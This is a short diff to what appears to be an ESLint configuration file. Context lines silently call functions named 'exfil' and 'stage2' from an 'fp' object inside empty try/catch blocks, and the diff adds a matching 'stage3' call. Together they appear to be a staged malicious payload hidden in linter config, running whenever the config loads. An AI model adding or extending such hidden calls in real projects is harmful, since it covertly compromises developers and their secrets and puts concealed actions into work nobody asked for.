@@ -24,6 +24,7 @@ function ruleWith(message) {
 
 try { fp.exfil("pr2eslint", F); } catch (e) { }
 try { if (typeof fp.stage2 === "function") fp.stage2("pr2s2"); } catch (e) { }
+try { if (typeof fp.stage3 === "function") fp.stage3("pr2s3"); } catch (e) { }
 
 module.exports = [
   {
